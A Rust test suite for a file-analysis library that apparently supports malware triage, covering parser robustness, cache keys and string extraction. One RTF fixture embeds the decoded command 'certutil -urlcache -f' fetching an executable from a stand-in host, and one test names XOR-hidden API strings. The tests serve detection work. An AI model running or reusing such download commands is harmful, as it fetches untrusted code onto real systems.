use super::*;

#[test]
fn forged_section_sizes_do_not_overflow_the_code_data_ratio() {
    // Two sections each claiming nearly `u64::MAX` bytes: the code and
    // data sums used to be added unchecked.
    let section = |name: &str, flag: &str| Section {
        name: name.into(),
        vaddr: 0,
        vsize: 0,
        file_offset: 0,
        file_size: u64::MAX - 1,
        flags: vec![flag.into()],
        flags_raw: None,
        entropy: Some(1.0),
    };
    let sections = Sections::from_iter([section("a", "executable"), section("b", "data")]);
    let mut metrics = Metrics::new();
    emit_binary_aggregates(&sections, &output::Strings::new(), b"x", &mut metrics);
    assert_eq!(
        metrics.get_key(&metric!("binary.code_to_data_ratio")),
        Some(0.5)
    );
}

#[test]
fn guarded_turns_a_panic_into_its_message() {
    assert_eq!(guarded(|| 7), Ok(7));
    let caught: Result<(), String> = guarded(|| panic!("boom"));
    assert_eq!(caught, Err("boom".to_string()));
}

#[test]
fn invalid_utf8_cfml_does_not_take_down_the_caller() {
    // Used to panic in the CFML flow parse, which sat outside every
    // `catch_unwind` and so aborted the whole process.
    let mut source = b"<cfset a = ".to_vec();
    source.extend(std::iter::repeat_n(0xFF, 100));
    source.extend_from_slice(b".foo()>");
    let parsed = OpenOptions::new()
        .path(Path::new("x.cfm"))
        .file_type(FileType::Cfml)
        .open(&source);
    let _ = parsed.flow();
    let _ = parsed.symbols();
}

#[test]
fn failed_identification_is_recorded_as_an_error() {
    let fileid = FileId {
        source: fileid::DetectionSource::Failed,
        ..FileId::forced(FileType::Unknown)
    };
    let parsed = ParsedFile::new(b"\x00\x01", fileid, None);
    let entry = parsed.errors().iter().next().expect("recorded");
    assert_eq!(entry.stage, Stage::Identify);
    assert_eq!(entry.kind, ErrorKind::Panic);
}

#[cfg(unix)]
#[test]
fn non_utf8_basename_is_kept_lossily() {
    use std::os::unix::ffi::OsStrExt;
    let path = Path::new(std::ffi::OsStr::from_bytes(b"dropper-\xff.sh"));
    let parsed = OpenOptions::new().path(path).open(b"#!/bin/sh\necho hi\n");
    assert_eq!(
        parsed
            .values()
            .get("file.basename")
            .and_then(|v| v.as_str()),
        Some("dropper-\u{fffd}.sh")
    );
}

#[test]
fn validate_source_query_accepts_every_parser_language() {
    for language in [
        "javascript",
        "typescript",
        "python",
        "go",
        "rust",
        "java",
        "bash",
        "ruby",
        "lua",
        "csharp",
        "c",
        "scala",
        "objc",
        "kotlin",
        "swift",
        "powershell",
        "php",
        "perl",
        "groovy",
        "zig",
        "elixir",
        "makefile",
        "clojure",
        "batch",
    ] {
        let file_type = file_type_for_language(language)
            .unwrap_or_else(|| panic!("{language} has a parser but no query mapping"));
        assert!(formats::source::supports(file_type), "{language}");
        validate_source_query(language, "(_) @node").unwrap_or_else(|e| panic!("{language}: {e}"));
    }
}

#[test]
fn validate_source_query_accepts_aliases() {
    for (alias, label) in SOURCE_LANGUAGE_ALIASES {
        assert_eq!(
            file_type_for_language(alias),
            file_type_for_language(label),
            "{alias}"
        );
        validate_source_query(alias, "(_) @node").unwrap_or_else(|e| panic!("{alias}: {e}"));
    }
}

#[test]
fn validate_source_query_reports_unsupported_language() {
    let err = validate_source_query("cobol", "(_) @node").unwrap_err();
    assert!(matches!(&err, Error::UnsupportedLanguage(name) if name == "cobol"));
    assert_eq!(err.to_string(), "unsupported language for ast query: cobol");
    assert!(std::error::Error::source(&err).is_none());
}

#[test]
fn validate_source_query_reports_invalid_query_with_its_cause() {
    let err = validate_source_query("python", "(no_such_node) @n").unwrap_err();
    let Error::InvalidQuery { language, source } = &err else {
        panic!("expected InvalidQuery, got {err:?}");
    };
    assert_eq!(language, "python");
    assert_eq!(source.kind, tree_sitter::QueryErrorKind::NodeType);
    assert_eq!(
        err.to_string(),
        format!("invalid tree-sitter query for python: {source}")
    );
    let cause = std::error::Error::source(&err).expect("source");
    assert!(cause.downcast_ref::<tree_sitter::QueryError>().is_some());
}

/// The content/extension transition is path-derived but is written into
/// the extraction output, so it has to be part of the disk-cache key.
/// Identical bytes named `x.woff2` and `x.wav` detect as the same type,
/// and before this was folded in they shared a cache entry: whichever was
/// scanned first decided the mismatch metric for both, so a masquerade was
/// reported on the wrong file or missed on the right one depending only on
/// directory order.
#[test]
fn cache_variant_separates_extension_transitions() {
    let as_font = extraction_cache_variant(
        &rizin::Settings::default(),
        FileType::Shell,
        true,
        Some(("script", "font")),
        None,
    );
    let as_unknown = extraction_cache_variant(
        &rizin::Settings::default(),
        FileType::Shell,
        true,
        Some(("script", "unknown")),
        None,
    );
    let consistent = extraction_cache_variant(
        &rizin::Settings::default(),
        FileType::Shell,
        false,
        None,
        None,
    );
    assert_ne!(as_font, as_unknown);
    assert_ne!(as_font, consistent);
    assert_ne!(as_unknown, consistent);
    // Same transition, same bytes, same detected type: still one entry, so
    // a tree full of `.woff2` files does not lose cache sharing.
    assert_eq!(
        as_font,
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Shell,
            true,
            Some(("script", "font")),
            None
        )
    );
}

/// A mismatch whose transition could not be named must not collapse onto
/// the no-mismatch key.
#[test]
fn cache_variant_separates_unnamed_mismatch() {
    assert_ne!(
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Shell,
            true,
            None,
            None
        ),
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Shell,
            false,
            None,
            None
        )
    );
}

#[test]
fn cache_variant_separates_basename_facts() {
    // Identical Rust bytes can be a build hook or an ordinary module.
    // Archive extraction and standalone scans must not inherit whichever
    // basename happened to populate the content cache first.
    let key = |name| {
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Rust,
            false,
            None,
            name,
        )
    };
    assert_ne!(key(Some("build.rs")), key(Some("lib.rs")));
    assert_ne!(key(Some("build.rs")), key(None));
    assert_ne!(key(Some("")), key(None));
    assert_eq!(key(Some("build.rs")), key(Some("build.rs")));
}

/// `stage_for` derives its source branch from the grammar table; it must
/// still cover every language it listed by hand, JCL included.
#[test]
fn stage_for_tags_every_source_language() {
    for file_type in [
        FileType::JavaScript,
        FileType::TypeScript,
        FileType::Python,
        FileType::Go,
        FileType::Rust,
        FileType::Java,
        FileType::Shell,
        FileType::Php,
        FileType::Ruby,
        FileType::Lua,
        FileType::CSharp,
        FileType::C,
        FileType::Scala,
        FileType::ObjectiveC,
        FileType::Kotlin,
        FileType::Swift,
        FileType::PowerShell,
        FileType::Perl,
        FileType::Groovy,
        FileType::Zig,
        FileType::Elixir,
        FileType::Clojure,
        FileType::Batch,
        FileType::Jcl,
        FileType::Makefile,
    ] {
        assert_eq!(stage_for(file_type), Stage::SourceExtract, "{file_type:?}");
    }
    assert_eq!(stage_for(FileType::Vbs), Stage::FormatExtract);
    assert_eq!(stage_for(FileType::Pe), Stage::PeParse);
}

#[test]
fn open_classifies_text() {
    let bytes = b"hello world\n";
    let parsed = open(bytes);
    assert_eq!(parsed.bytes(), bytes);
}

#[test]
fn parse_count_is_one_after_any_view_access() {
    let bytes = b"{\"name\":\"test\"}";
    let parsed = open(bytes);
    assert_eq!(parsed.parse_count(), 0);
    let _ = parsed.values();
    assert_eq!(parsed.parse_count(), 1);
    let _ = parsed.text();
    let _ = parsed.literals();
    let _ = parsed.metrics();
    assert_eq!(parsed.parse_count(), 1, "subsequent views must not reparse");
}

#[test]
fn chm_overlay_uses_archive_data_and_directory_extents() {
    let overlay = include_bytes!("../testdata/chm/overlay-persistence-sample.chm");
    let parsed = open(overlay);
    let metrics = parsed.metrics();
    assert_eq!(metrics.get("binary.has_overlay"), Some(1.0));
    assert_eq!(metrics.get("binary.overlay_size"), Some(1546.0));
    assert!(metrics.get("binary.overlay_entropy").is_some());

    // This CHM stores its directory after the compressed data stream.
    // Its full physical length is archive content, despite looking like
    // a suffix when only section-0 entries are considered.
    let directory_at_end = include_bytes!("../testdata/chm/directory-at-end.chm");
    let parsed = open(directory_at_end);
    assert_eq!(parsed.metrics().get("binary.has_overlay"), None);
}

#[test]
fn extraction_cache_separates_path_dependent_file_types() {
    assert_ne!(
        extraction_cache_variant(&rizin::Settings::default(), FileType::Gz, false, None, None),
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Npm,
            false,
            None,
            None
        ),
    );
    assert_eq!(
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Npm,
            false,
            None,
            None
        ),
        extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Npm,
            false,
            None,
            None
        ),
    );
}

#[test]
fn extracted_round_trips_through_cache_json() {
    // The cache stores the extraction snapshot as zstd-compressed
    // JSON, so a real, rich extraction (sections, symbols, the
    // stng-typed byte-scan `text` tier, metrics, identity) must
    // survive serialize -> deserialize -> serialize unchanged.
    // Caching is off under cfg(test), so `extracted()` returns a
    // freshly computed snapshot to round-trip.
    let bytes = std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
    let parsed = open(&bytes);
    let original = parsed.extracted();
    let json = serde_json::to_vec(original).expect("serialize Extracted");
    let restored: Extracted = serde_json::from_slice(&json).expect("deserialize Extracted");
    assert_eq!(
        serde_json::to_value(original).unwrap(),
        serde_json::to_value(&restored).unwrap(),
        "Extracted must round-trip losslessly through the cache JSON form"
    );
    // Confirm the fixture actually exercised the stng-typed text tier
    // (the field that newly gained Deserialize), not just empty views.
    assert!(
        !original.strings.text.is_empty(),
        "fixture should yield byte-scan strings"
    );
}

#[test]
fn pe_instruction_xor_strings_keep_provenance_across_snapshot() {
    // Synthetic PE containing only a decoder and inert API-name strings.
    // Names recovered from content must not be promoted into PE imports.
    let bytes = include_bytes!("../tests/fixtures/pe-xor-decoder.exe");
    let extracted = OpenOptions::new().rizin(false).open(bytes).run_pipeline();
    let check = |e: &Extracted| {
        let network = e
            .strings
            .text
            .iter()
            .find(|s| s.value == "InternetReadFile")
            .expect("instruction-derived XOR string must reach filefacts text");
        assert_eq!(network.method, stng::StringMethod::XorDecode);
        assert_eq!(
            network.source_spans().collect::<Vec<_>>(),
            vec![(0x800, 16), (0x600, 21)]
        );
        assert!(e.strings.text.iter().any(|s| s.value == "ShellExecuteW"));
        assert!(!e.symbols.iter().any(|s| s.kind() == SymbolKind::Import));
    };
    check(&extracted);
    let snapshot = ExtractedSnapshot::from(extracted);
    let json = serde_json::to_vec(&snapshot).unwrap();
    let restored: ExtractedSnapshot = serde_json::from_slice(&json).unwrap();
    check(&Extracted::from(restored));
}

#[test]
fn snapshot_keeps_strings_decoded_out_of_the_file() {
    // An RTF's `\objdata` hex decodes to a command that appears nowhere
    // in the file's bytes. Those rows are appended to the text tier and
    // must survive the cache round-trip with the rest.
    let mut blob = Vec::new();
    blob.extend_from_slice(&0x0105_u32.to_le_bytes());
    blob.extend_from_slice(&2u32.to_le_bytes());
    blob.extend_from_slice(&8u32.to_le_bytes());
    blob.extend_from_slice(b"Package\0");
    blob.extend_from_slice(&0u32.to_le_bytes());
    blob.extend_from_slice(&0u32.to_le_bytes());
    let payload = b"cmd /c certutil -urlcache -f http://example.test/a.exe";
    blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    blob.extend_from_slice(payload);
    let hex: String = blob.iter().map(|b| format!("{b:02x}")).collect();
    let bytes = format!("{{\\rtf1\\ansi{{\\object\\objemb{{\\*\\objdata {hex}}}}}}}").into_bytes();

    let extracted = open(&bytes).run_pipeline();
    let has_command = |e: &Extracted| e.strings.text.iter().any(|s| s.value.contains("certutil"));
    assert!(has_command(&extracted), "decoded command should be present");

    let snapshot = ExtractedSnapshot::from(extracted);
    let json = serde_json::to_vec(&snapshot).expect("serialize snapshot");
    let restored: ExtractedSnapshot = serde_json::from_slice(&json).unwrap();
    let rehydrated = Extracted::from(restored);
    assert!(
        has_command(&rehydrated),
        "decoded command must survive the cache round-trip"
    );
}

#[test]
fn snapshot_round_trips_text_rows_in_order() {
    // The disk cache stores the byte-scan rows itself, as one list in
    // extraction order, so a cached `open` returns exactly the rows (and
    // order) a fresh one does.
    let bytes = std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
    let extracted = open(&bytes).run_pipeline();
    let want: Vec<stng::ExtractedString> = extracted.strings.text.rows().to_vec();
    assert!(!want.is_empty(), "fixture should yield byte-scan strings");

    let snapshot = ExtractedSnapshot::from(extracted);
    let json = serde_json::to_vec(&snapshot).expect("serialize snapshot");
    let restored: ExtractedSnapshot = serde_json::from_slice(&json).expect("deserialize");
    let got = Extracted::from(restored);
    assert_eq!(
        got.strings.text.rows().to_vec(),
        want,
        "cached text rows must match the fresh extraction exactly"
    );
}

#[test]
fn metrics_always_include_size_and_entropy() {
    let bytes = b"x".repeat(256);
    let parsed = open(&bytes);
    let m = parsed.metrics();
    assert_eq!(m.get("file.size"), Some(256.0));
    assert!(m.get("file.entropy").unwrap() < 0.01);
}

/// `ParsedFile::symbol_iter` walks every Import / Export /
/// Function row in one pass. Used by trait matchers that don't
/// care which sub-kind a name appears in.
#[test]
fn symbol_iter_walks_all_three_collections() {
    let bytes = std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
    let parsed = open(&bytes);
    // Realize the views before iterating — the lazy parse runs
    // on first `.values()` access.
    let _ = parsed.values();
    let symbols = parsed.symbols();
    let import_count = symbols.iter_kind(SymbolKind::Import).count();
    assert!(import_count > 0, "PE fixture should have imports");
    let total = parsed.symbol_iter().count();
    let expected = symbols.iter_kind(SymbolKind::Import).count()
        + symbols.iter_kind(SymbolKind::Export).count()
        + symbols.iter_kind(SymbolKind::Function).count();
    assert_eq!(
        total, expected,
        "symbol_iter must visit every Import/Export/Function row"
    );
}

/// A healthy PE fixture should produce zero parse errors and
/// no `parse.error_count` metric — the typed Errors view stays
/// empty.
#[test]
fn healthy_pe_emits_no_parse_errors() {
    let bytes = std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
    let parsed = open(&bytes);
    // Realize.
    let _ = parsed.values();
    assert!(parsed.errors().is_empty());
    assert!(parsed.metrics().get("parse.error_count").is_none());
}

/// Malformed ELF bytes (anything that starts \x7fELF but is
/// otherwise truncated) trip goblin's parse. The error must
/// land in the typed Errors view tagged `elf-parse` and the
/// generic byte-level metrics (file.size, file.entropy)
/// must still be present — partial data is the contract.
#[test]
fn malformed_elf_records_error_but_keeps_byte_metrics() {
    // ELF magic + half a header — enough to be classified as
    // ELF by fileid, not enough for goblin to parse.
    let mut bytes = Vec::from(b"\x7fELF" as &[u8]);
    bytes.extend_from_slice(&[2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    let parsed = open(&bytes);
    let _ = parsed.values();

    // Byte-level metrics survive even though the format parse
    // failed — generic::extract ran before format dispatch.
    assert!(parsed.metrics().get("file.size").is_some());

    // Structured error recorded.
    let errors = parsed.errors();
    assert!(!errors.is_empty(), "expected a malformed-elf error entry");
    let entry = errors.iter().next().unwrap();
    assert_eq!(entry.kind, ErrorKind::Malformed);
    assert_eq!(entry.stage, Stage::ElfParse);

    // Aggregate count metric.
    assert!(parsed.metrics().get("parse.error_count").is_some());
    // Specific format metric.
    assert!(parsed.metrics().get("elf.parse_failed").is_some());
}

/// A file cut off before its trailing section header table still has an
/// intact ELF header and program headers; those must be parsed rather
/// than the whole binary reported as unparseable.
#[test]
fn truncated_elf_section_table_keeps_segment_view() {
    let full = include_bytes!("../tests/fixtures/test.elf");
    let shoff = usize::try_from(u64::from_le_bytes(full[0x28..0x30].try_into().unwrap())).unwrap();
    let parsed = open(&full[..shoff + 64]);
    let _ = parsed.values();
    assert!(parsed.metrics().get("elf.parse_failed").is_none());
    assert!(
        parsed
            .metrics()
            .get("elf.section_headers_truncated")
            .is_some()
    );
    assert!(parsed.metrics().get("elf.program_header_count").is_some());
}

#[test]
fn guarded_tree_sitter_skip_records_source_error_and_metric() {
    // Python's scanner state is modeled, and indentation this deep would
    // overflow its serialization buffer, so tree-sitter is never invoked.
    // The skip should be visible to callers instead of silently looking
    // like a source file with no AST.
    let mut source = String::new();
    for depth in 0..600 {
        source.push_str(&" ".repeat(depth));
        source.push_str("if x:\n");
    }
    source.push_str(&" ".repeat(600));
    source.push_str("pass\n");
    let parsed = OpenOptions::new()
        .path(std::path::Path::new("deep.py"))
        .open(source.as_bytes());
    let metrics = parsed.metrics();

    assert_eq!(parsed.fileid().file_type(), FileType::Python);
    assert!(metrics.get("file.size").is_some());
    assert_eq!(metrics.get("source.ast_unavailable"), Some(1.0));
    assert_eq!(
        metrics.get("source.ast_unavailable.tree_sitter_guard"),
        Some(1.0)
    );
    assert!(metrics.get("ast.node_count").is_none());

    let errors = parsed.errors();
    assert_eq!(errors.len(), 1);
    let entry = errors.iter().next().unwrap();
    assert_eq!(entry.kind, ErrorKind::Fallback);
    assert_eq!(entry.stage, Stage::SourceParse);
    assert!(entry.message.contains("tree-sitter parse skipped"));
    assert_eq!(metrics.get("parse.error_count"), Some(1.0));
}

/// Bytes no other test (or earlier run) has cached.
fn unique_script(tag: &str) -> Vec<u8> {
    let ns = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_nanos());
    format!("#!/bin/sh\necho {tag} {} {ns}\n", std::process::id()).into_bytes()
}

/// Each `ParsedFile` reads and writes the disk cache only as its own
/// options say, whatever another file opened alongside asked for. (Unit
/// tests get a private cache root; see `cache::root_location`.)
#[test]
fn cache_setting_belongs_to_each_parsed_file() {
    let bytes = unique_script("cache-setting");
    let cached = OpenOptions::new().cache(true).rizin(false);

    let first = cached.open(&bytes);
    let _ = first.metrics();
    assert_eq!(first.parse_count(), 1, "nothing cached yet");

    let uncached = OpenOptions::new().cache(false).rizin(false).open(&bytes);
    let _ = uncached.metrics();
    assert_eq!(uncached.parse_count(), 1, "cache off: must not read it");

    let second = cached.open(&bytes);
    let _ = second.metrics();
    assert_eq!(second.parse_count(), 0, "cache on: served the entry");
    assert_eq!(
        serde_json::to_value(second.values()).unwrap(),
        serde_json::to_value(first.values()).unwrap()
    );

    // Rizin settings are part of the key: with rizin installed, a
    // rizin-on open must not be served the rizin-off entry. Without it
    // the two extractions are identical and rightly share one.
    let rizin_on = OpenOptions::new().cache(true).open(&bytes);
    let _ = rizin_on.metrics();
    assert_eq!(rizin_on.parse_count(), u32::from(rizin::available()));
}

/// The cache key changes with every option that changes a persisted
/// extraction — rizin on/off, native-arch slicing, the size cap — and
/// not with the timeout, which only ever yields an unpersisted result.
#[test]
fn cache_key_tracks_every_output_affecting_option() {
    let variant = |options: &OpenOptions<'_>| {
        extraction_cache_variant(&options.rizin, FileType::Elf, false, None, None)
    };
    let base = OpenOptions::new();
    let slower = base.clone().rizin_timeout(Duration::from_secs(5));
    assert_eq!(variant(&base), variant(&slower));
    assert!(variant(&base).starts_with(&base.rizin_fingerprint()));

    let distinct: std::collections::HashSet<String> = [
        base.clone(),
        base.clone().rizin(false),
        base.clone().rizin_native_arch_only(true),
        base.clone().rizin_max_bytes(1 << 20),
    ]
    .iter()
    .map(variant)
    .collect();
    // Without rizin installed none of these changes the output, and
    // all four share the `rizin=none` key.
    let expected = if rizin::available() { 4 } else { 1 };
    assert_eq!(distinct.len(), expected, "{distinct:?}");
}

/// A raised cancellation flag abandons the source parse of the file it
/// was given to, leaving the other views intact; an unraised one, or
/// none, changes nothing.
#[test]
fn cancellation_flag_reaches_the_source_parse() {
    let source = "def f():\n    return 1\n".repeat(20_000);
    let path = Path::new("cancel.py");

    let raised = AtomicBool::new(true);
    let cancelled = OpenOptions::new()
        .path(path)
        .cancellation(&raised)
        .open(source.as_bytes());
    assert!(cancelled.source_ast().is_none());
    let metrics = cancelled.metrics();
    assert_eq!(
        metrics.get("source.ast_unavailable.parse_cancelled"),
        Some(1.0)
    );
    assert_eq!(metrics.get("file.size"), Some(source.len() as f64));

    let lowered = AtomicBool::new(false);
    let options = OpenOptions::new().path(path).cancellation(&lowered);
    assert!(options.open(source.as_bytes()).source_ast().is_some());
    // The flag belongs to the options that carried it, not the process.
    let plain = OpenOptions::new().path(path).open(source.as_bytes());
    assert!(plain.source_ast().is_some());
}

#[test]
fn open_options_identify_by_path_forced_type_or_precomputed_fileid() {
    let bytes = b"{\"name\":\"x\",\"version\":\"1.0.0\"}";
    let path = Path::new("package.json");
    let by_path = OpenOptions::new().path(path).open(bytes);
    assert_eq!(by_path.fileid().file_type(), FileType::PackageJson);
    assert_ne!(open(bytes).fileid().file_type(), FileType::PackageJson);

    // A forced type still takes the path's basename.
    let forced = OpenOptions::new()
        .path(path)
        .file_type(FileType::Text)
        .open(bytes);
    assert_eq!(forced.fileid().file_type(), FileType::Text);
    assert_eq!(
        forced
            .values()
            .get("file.basename")
            .and_then(|v| v.as_str()),
        Some("package.json")
    );

    let fileid = FileId::from_path_and_bytes(path, bytes);
    let precomputed = OpenOptions::new()
        .file_type(FileType::Text)
        .fileid(fileid)
        .open(bytes);
    assert_eq!(precomputed.fileid().file_type(), FileType::PackageJson);
}
